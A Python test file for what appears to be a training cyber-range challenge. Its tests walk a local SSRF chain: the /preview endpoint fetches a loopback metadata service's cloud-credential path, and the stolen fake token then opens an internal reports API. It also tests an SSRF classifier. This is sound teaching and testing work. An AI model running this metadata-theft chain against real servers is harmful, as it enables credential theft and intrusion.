"""CH3 The Stolen Key（校園網址預覽 SSRF，#153 Campaign Pack v1）攻擊面的真實驗證。

不是模擬：起真的 `ThreadingHTTPServer`（含 loopback-only 的 metadata service），真的
透過 `/preview` 讓伺服器去打自己碰得到、外部連不到的位址，真的讀出偽造憑證，再真的
拿那組憑證打 `/internal/reports` 拿到內部資源 —— T1190（初始入口）→ T1552（SSRF 讀
憑證）→ T1550（憑證橫向 pivot）三步全部走一次。若這條測試紅了，代表攻擊鏈本身壞了。
"""

from __future__ import annotations

import http.client
import importlib.util
import json
import threading
import time
from http.server import ThreadingHTTPServer
from pathlib import Path

import pytest

_APP_PATH = Path(__file__).resolve().parents[2] / "deploy" / "range-target" / "app.py"


def _load_app_module(tmp_path: Path, metadata_port: int):
    import os

    os.environ["TARGET_METADATA_PORT"] = str(metadata_port)
    os.environ["TARGET_LOG_PATH"] = str(tmp_path / "app.log")
    spec = importlib.util.spec_from_file_location(f"range_target_app_ch3_{metadata_port}", _APP_PATH)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


@pytest.fixture
def app_module(tmp_path, unused_tcp_port_factory=None):
    # 每個測試各用自己的 metadata port，避免平行測試互相搶 bind。
    import socket

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("127.0.0.1", 0))
        port = s.getsockname()[1]
    return _load_app_module(tmp_path, port)


@pytest.fixture
def live_stack(app_module):
    meta_server = ThreadingHTTPServer(("127.0.0.1", app_module.METADATA_PORT), app_module._MetadataHandler)
    threading.Thread(target=meta_server.serve_forever, daemon=True).start()

    app_server = ThreadingHTTPServer(("127.0.0.1", 0), app_module.Handler)
    app_port = app_server.server_address[1]
    threading.Thread(target=app_server.serve_forever, daemon=True).start()
    time.sleep(0.1)

    try:
        yield app_port, app_module
    finally:
        app_server.shutdown()
        meta_server.shutdown()


class TestSsrfClassification:
    def test_loopback_target_is_flagged(self, app_module):
        assert app_module._looks_like_ssrf("http://127.0.0.1:9999/x") is True

    def test_link_local_metadata_style_target_is_flagged(self, app_module):
        assert app_module._looks_like_ssrf("http://169.254.169.254/latest/meta-data/") is True

    def test_private_ranges_are_flagged(self, app_module):
        assert app_module._looks_like_ssrf("http://10.0.0.5/") is True
        assert app_module._looks_like_ssrf("http://192.168.1.1/") is True

    def test_public_looking_url_is_not_flagged(self, app_module):
        assert app_module._looks_like_ssrf("https://example.com/cat.png") is False


class TestMetadataServiceIsLoopbackOnly:
    def test_metadata_handler_serves_role_name(self, live_stack):
        _, app_module = live_stack
        conn = http.client.HTTPConnection("127.0.0.1", app_module.METADATA_PORT, timeout=5)
        conn.request("GET", "/latest/meta-data/iam/security-credentials/")
        resp = conn.getresponse()
        assert resp.status == 200
        assert resp.read().decode().strip() == app_module.METADATA_ROLE_NAME

    def test_metadata_handler_404s_unknown_paths(self, live_stack):
        _, app_module = live_stack
        conn = http.client.HTTPConnection("127.0.0.1", app_module.METADATA_PORT, timeout=5)
        conn.request("GET", "/nope")
        resp = conn.getresponse()
        assert resp.status == 404
        resp.read()


class TestSsrfMetadataTheftAndApiPivotExploitChain:
    """真 HTTP round-trip。T1190（preview 入口）→ T1552（SSRF 竊憑證）→ T1550（pivot）。"""

    def test_preview_accepts_arbitrary_destination_without_an_allowlist(self, live_stack):
        app_port, _ = live_stack
        conn = http.client.HTTPConnection("127.0.0.1", app_port, timeout=5)
        conn.request("GET", "/preview?url=http://127.0.0.1:1/unreachable")
        resp = conn.getresponse()
        # 沒有目的地白名單：連不到的內部位址一樣「被允許嘗試」，只是連線本身失敗（502）。
        assert resp.status == 502
        resp.read()

    def test_ssrf_reads_the_metadata_role_name_through_preview(self, live_stack):
        app_port, app_module = live_stack
        conn = http.client.HTTPConnection("127.0.0.1", app_port, timeout=5)
        conn.request("GET",
                      f"/preview?url=http://127.0.0.1:{app_module.METADATA_PORT}"
                      "/latest/meta-data/iam/security-credentials/")
        resp = conn.getresponse()
        assert resp.status == 200
        assert resp.read().decode().strip() == app_module.METADATA_ROLE_NAME

    def test_ssrf_steals_the_fake_credential_via_preview(self, live_stack):
        app_port, app_module = live_stack
        role = app_module.METADATA_ROLE_NAME
        conn = http.client.HTTPConnection("127.0.0.1", app_port, timeout=5)
        conn.request("GET",
                      f"/preview?url=http://127.0.0.1:{app_module.METADATA_PORT}"
                      f"/latest/meta-data/iam/security-credentials/{role}")
        resp = conn.getresponse()
        assert resp.status == 200
        creds = json.loads(resp.read())
        assert creds["Token"] == app_module.INTERNAL_API_TOKEN

    def test_internal_reports_denies_without_the_stolen_token(self, live_stack):
        app_port, _ = live_stack
        conn = http.client.HTTPConnection("127.0.0.1", app_port, timeout=5)
        conn.request("GET", "/internal/reports")
        resp = conn.getresponse()
        assert resp.status == 403
        resp.read()

    def test_internal_reports_denies_a_wrong_token(self, live_stack):
        app_port, _ = live_stack
        conn = http.client.HTTPConnection("127.0.0.1", app_port, timeout=5)
        conn.request("GET", "/internal/reports", headers={"X-Internal-Token": "not-the-real-one"})
        resp = conn.getresponse()
        assert resp.status == 403
        resp.read()

    def test_stolen_token_pivots_into_the_internal_api(self, live_stack):
        app_port, app_module = live_stack
        conn = http.client.HTTPConnection("127.0.0.1", app_port, timeout=5)
        conn.request("GET", "/internal/reports",
                      headers={"X-Internal-Token": app_module.INTERNAL_API_TOKEN})
        resp = conn.getresponse()
        assert resp.status == 200
        assert b"internal reports" in resp.read()

    def test_preview_requires_a_url_parameter(self, live_stack):
        app_port, _ = live_stack
        conn = http.client.HTTPConnection("127.0.0.1", app_port, timeout=5)
        conn.request("GET", "/preview")
        resp = conn.getresponse()
        assert resp.status == 400
        resp.read()
